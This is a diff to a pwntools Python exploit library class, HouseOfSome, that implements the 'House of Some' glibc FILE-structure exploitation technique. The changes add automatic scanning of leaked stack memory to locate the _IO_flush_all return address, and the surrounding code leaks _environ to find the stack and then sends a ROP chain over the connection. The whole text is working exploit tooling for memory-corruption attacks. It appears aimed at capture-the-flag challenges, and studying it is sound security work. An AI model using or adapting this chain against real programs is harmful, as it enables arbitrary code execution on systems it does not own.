@@ -5,6 +5,7 @@ ref: https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-
 """
 
 from pwn import *
+import bisect
 # context.arch = "amd64"
 
 class HouseOfSome:
@@ -74,6 +75,13 @@ class HouseOfSome:
         self.switch = 0
         self.addr_panel = [self.controled_addr, self.controled_addr+self.panel]
 
+        self.functions = [
+            (f.address, f) for f in self.libc.functions.values()
+        ]
+        self.functions.sort(key=lambda x: x[0])
+        self.text_section_start = self.libc.get_section_by_name(".text").header.sh_addr + self.libc.address
+        self.text_section_end = self.libc.get_section_by_name(".text").header.sh_size + self.text_section_start
+
     def _next_control_addr(self, addr, len):
         # return addr + len
         """
@@ -117,7 +125,7 @@ class HouseOfSome:
         assert b"\n" not in payload, "\\n in payload."
         return payload
     
-    def bomb(self, io: tube, retn_addr):
+    def bomb(self, io: tube, retn_addr=0):
 
         stack = self.bomb_raw(io, retn_addr)
 
@@ -129,7 +137,7 @@ class HouseOfSome:
         assert b"\n" not in rop_chain, "\\n in rop_chain"
         io.sendline(rop_chain)
 
-    def bomb_raw(self, io: tube, retn_addr):
+    def bomb_raw(self, io: tube, retn_addr=0):
         payload = self.write(1, self.libc.symbols['_environ'], 0x8)
         io.sendline(payload)
         stack_leak = u64(io.recv(8).ljust(8, b"\x00"))
@@ -138,8 +146,13 @@ class HouseOfSome:
         payload = self.write(1, stack_leak - self.LEAK_LENGTH, self.LEAK_LENGTH)
         io.sendline(payload)
         # retn_addr = self.libc.symbols['_IO_file_underflow'] + 390
-        log.success(f"retn_addr : {retn_addr:#x}")
         buf = io.recv(self.LEAK_LENGTH)
+        flush_retn_addr = self.stack_view(buf)
+        if retn_addr == 0 and flush_retn_addr != 0:
+            retn_addr = flush_retn_addr
+            success("retn_addr(_IO_flush_all) find")
+            success(f"fix retn_addr to {flush_retn_addr:#x}")
+        log.success(f"retn_addr : {retn_addr:#x}")
         offset = buf.find(p64(retn_addr))
         log.success(f"offset : {offset:#x}")
 
@@ -149,3 +162,40 @@ class HouseOfSome:
         io.sendline(payload)
 
         return stack_leak - self.LEAK_LENGTH + offset
+    
+    def stack_view(self, stack_leak_bytes: bytes):
+        # TODO this function now only support amd64 
+        got_ret_addr = 0
+        next_flush = False
+        for i in range(0, len(stack_leak_bytes), 8):
+            value = u64(stack_leak_bytes[i:i+8])
+            idx = bisect.bisect_left(self.functions, value, key=lambda x: x[0])
+            if idx >= len(self.functions) or self.functions[idx][1].address != value:
+                idx -= 1
+            if idx < 0 or value - self.functions[idx][1].address >= self.functions[idx][1].size:
+                if value < self.libc.address:
+                    continue
+                # TODO show rwx more info
+                # rwx = ""
+                # rwx += "r" if segment.header.p_flags & 4 else "-"
+                # rwx += "w" if segment.header.p_flags & 2 else "-"
+                # rwx += "x" if segment.header.p_flags & 1 else "-"
+                if self.text_section_start <= value <= self.text_section_end: 
+                    print(f"[{i:#x}] {value:#x} => libc.address+{value - self.libc.address:#x}")
+                    if next_flush == True and got_ret_addr == 0:
+                        got_ret_addr = value
+                continue
+
+            function = self.functions[idx][1]
+            if value - function.address > function.size:
+                continue
+            print(f"[{i:#x}] {value:#x} => {function.name}+{value - function.address}")
+            if "_IO_flush_all" in function.name:
+                got_ret_addr = value
+            if got_ret_addr == 0 and "_IO_do_write" in function.name:
+                next_flush = True
+
+        return got_ret_addr
+            
+            
+        
